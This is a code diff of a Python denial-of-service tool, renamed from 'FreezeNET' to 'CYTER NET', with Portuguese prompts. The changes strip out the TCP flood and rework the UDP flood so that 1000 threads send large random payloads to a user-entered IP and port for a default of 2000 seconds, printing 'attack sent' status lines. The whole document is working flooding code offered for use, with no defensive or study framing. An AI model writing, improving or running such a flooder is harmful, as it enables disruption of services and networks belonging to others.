@@ -7,23 +7,26 @@ import sys
 import os
 from os import system, name
 from pyfiglet import figlet_format
-from colorama import Fore, Back, Style, init
+from colorama import Fore, init
 import subprocess
 
 # Initialize Colorama
 init(autoreset=True)
 
+# Lock to synchronize thread output
+print_lock = threading.Lock()
+
 def print_banner():
-    # Print banner with pyfiglet and colors
     os.system('clear' if name != 'nt' else 'cls')
-    banner = figlet_format("FreezeNET", font="slant")
-    print(Fore.GREEN + banner)
+    banner = figlet_format("CYTER NET", font="big")
+    print(Fore.YELLOW + banner)
 
 def clear_screen():
     os.system('clear' if name != 'nt' else 'cls')
 
-def print_attack_status(ip, port, protocol, ping):
-    print(Fore.GREEN + f"[FN] Ataque enviado: \033[0m{ip}:{port} - {protocol}\033[32m | Ping: \033[0m{ping}ms")
+def print_attack_status(ip, port, protocol, ping, sent_packets):
+    with print_lock:
+        print(Fore.YELLOW + f"[Cyter] Atack enviado: \033[0m{ip}:{port} - {protocol} \033[93m| Ping: \033[0m{ping}")
 
 def get_ping(ip):
     try:
@@ -32,62 +35,40 @@ def get_ping(ip):
             stderr=subprocess.STDOUT,
             universal_newlines=True
         )
-        time_ms = output.split('time=')[-1].split(' ms')[0]
+        time_ms = output.split('time=')[-1].split('ms')[0]
         return time_ms
     except subprocess.CalledProcessError:
-        return '\033[93m+999'
+        return '+999'
     except Exception as e:
-        return f'\033[93mErro: {str(e)}'
+        return f'Erro: {str(e)}'
 
-def udp_flood(ip, port, duration, packets):
-    data = random._urandom(1024)
+def udp_flood(ip, port, duration=2000, min_size_mb=6, max_size_mb=10):
+    sent_packets = 0
     start_time = time.time()
     while time.time() - start_time < duration:
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                 addr = (ip, port)
-                for _ in range(packets):
-                    s.sendto(data, addr)
+                data_size = random.randint(min_size_mb * 1024 * 1024, max_size_mb * 1024 * 1024)  # Size between min_size_mb and max_size_mb MB
+                data = random._urandom(data_size)
+                s.sendto(data, addr)
+                sent_packets += 1
                 ping = get_ping(ip)
-                print_attack_status(ip, port, 'UDP', ping)
+                print_attack_status(ip, port, 'UDP', ping, sent_packets)
+                time.sleep(random.uniform(0.01, 0.05))  # Random short pause
         except Exception as e:
-            print(Fore.RED + f"[ERROR] {str(e)}")
-
-def tcp_flood(ip, port, duration, packets):
-    data = random._urandom(16)
-    start_time = time.time()
-    while time.time() - start_time < duration:
-        try:
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                s.connect((ip, port))
-                for _ in range(packets):
-                    s.send(data)
-                ping = get_ping(ip)
-                print_attack_status(ip, port, 'TCP', ping)
-        except Exception as e:
-            print(Fore.RED + f"[ERROR] {str(e)}")
+            with print_lock:
+                print(Fore.RED + f"[ERROR] {str(e)}")
 
 def main():
     print_banner()
 
-    test = input(Fore.CYAN + "\033[93mDeseja continuar? (y/n): ").strip().lower()
-    if test == "n":
-        sys.exit(0)
-
-    ip = input(Fore.CYAN + "\033[92mEndereço/Ip: \033[0m").strip()
-    port = int(input(Fore.CYAN + "\033[92mPort: \033[0m").strip())
-    choice = input(Fore.CYAN + "\033[92mUdp-Flood (y/n): \033[0m").strip().lower()
-    duration = int(input(Fore.CYAN + "\033[92mTempo: \033[0m").strip())
-    packets = int(input(Fore.CYAN + "\033[92mPacotes: \033[0m").strip())
-
-    if choice == 'y':
-        target_function = udp_flood
-    else:
-        target_function = tcp_flood
+    ip = input(Fore.YELLOW + "\033[96mEndereço/Ip: \033[0m").strip()
+    port = int(input(Fore.YELLOW + "\033[96mPort: \033[0m").strip())
 
     threads = []
-    for _ in range(packets):
-        thread = threading.Thread(target=target_function, args=(ip, port, duration, packets))
+    for _ in range(1000):  # Define o número de threads para 1000
+        thread = threading.Thread(target=udp_flood, args=(ip, port))
         thread.start()
         threads.append(thread)
 
